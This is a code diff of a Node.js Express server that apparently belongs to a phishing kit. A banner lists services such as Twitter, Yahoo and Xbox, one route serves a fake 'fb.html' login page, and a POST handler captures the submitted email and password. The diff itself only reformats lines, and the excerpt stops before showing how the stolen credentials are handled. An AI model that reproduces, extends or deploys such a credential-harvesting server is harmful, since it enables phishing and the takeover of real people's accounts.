@@ -1,8 +1,14 @@
-const express = require("express");
-const https = require("https");
+const express = 
+require("express");
 
-const bodyParser = require("body-parser");
-const { ServerResponse } = require("http");
+const https 
+= require("https");
+
+const bodyParser 
+= require("body-parser");
+
+const { ServerResponse } 
+= require("http");
 
 const app = express();
 
@@ -24,11 +30,14 @@ Twitch[31]:              Twitter[32]:                  Vk[33]:\n
 Wordpress[34]:           Yahoo[35]:                    xbox[36]:\n
 `);
 
-app.get("/", function(req, res){
+app.get("/", 
+    function(req, res)
+    {
     res.sendFile(__dirname + "/fb.html")
 }); 
 
-app.post("/", function(req, res){
+app.post("/", function(req, res)
+{
     console.log("Post Request Recieved");
         const email = req.body.email;
         const new_password = req.body.password;
